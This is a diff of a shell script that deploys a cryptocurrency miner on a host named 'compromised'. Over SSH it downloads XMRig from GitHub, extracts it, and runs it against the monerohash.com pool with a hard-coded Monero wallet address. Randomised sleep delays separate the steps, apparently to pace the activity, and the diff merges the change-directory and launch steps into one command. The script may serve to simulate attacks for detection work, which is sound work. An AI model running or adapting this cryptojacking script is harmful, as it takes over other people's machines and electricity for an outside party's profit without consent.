@@ -13,10 +13,7 @@ ssh compromised "wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/x
 ssh compromised "tar -xvzf xmrig-6.24.0-linux-static-x64.tar.gz"
     sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
-ssh compromised "cd xmrig-6.24.0/"
-    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
-
-ssh compromised "./xmrig -o monerohash.com:9999 -u 45Md9tgyseEBneE3ohkKzEjJLNwakxtxBVPpdU6LyA533Y4bdXdS3UwiT7pYbsonL8GEtmth43oHiRg8Dbw8WWFh847n1z7 -k --tls" &
+ssh compromised "~/xmrig-6.24.0/xmrig -o monerohash.com:9999 -u 45Md9tgyseEBneE3ohkKzEjJLNwakxtxBVPpdU6LyA533Y4bdXdS3UwiT7pYbsonL8GEtmth43oHiRg8Dbw8WWFh847n1z7 -k --tls" &
 MINE_PID=$!
     sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
